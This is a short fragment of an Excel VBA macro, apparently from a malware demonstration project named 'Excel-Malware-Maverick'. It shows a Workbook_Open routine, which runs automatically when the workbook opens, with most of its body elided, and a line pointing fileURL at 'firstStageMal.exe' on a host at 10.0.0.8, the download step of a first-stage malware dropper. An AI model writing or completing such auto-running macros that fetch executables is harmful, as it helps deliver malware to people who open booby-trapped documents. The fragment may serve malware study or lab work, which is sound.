...
Private Sub Workbook_Open()
    ...
    ' Check if Excel is already running https://github.com/ravi5hanka/Excel-Malware-Maverick/blob/main/excel-macro-MAL.vba
    ...
    fileURL = "http://10.0.0.8:8000/firstStageMal.exe"
